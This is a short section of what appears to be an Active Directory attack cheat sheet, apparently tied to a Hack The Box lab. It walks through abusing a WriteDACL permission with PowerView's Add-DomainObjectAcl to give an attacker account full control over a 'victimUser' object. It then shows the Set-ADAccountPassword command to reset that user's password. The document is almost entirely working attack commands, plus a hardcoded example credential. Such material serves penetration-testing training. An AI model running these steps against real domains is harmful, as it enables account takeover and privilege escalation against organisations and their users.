#### **2. Users: Gain Full Control Over a User**

**Scenario:**  
You have `WriteDACL` over a user. Use it to grant full control of the user object.

**Steps:**

1. **Import PowerView**  
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant Full Control**  
   Grant full control over the target user (e.g., `victimUser`):
   ```powershell
   Add-DomainObjectAcl -TargetIdentity victimUser -Rights All -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This allows you to modify any attribute or permissions of the target user.

4. **Reset the User’s Password**  
   After gaining control, reset the user’s password:
   ```powershell
   Set-ADAccountPassword -Identity victimUser -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
   ```
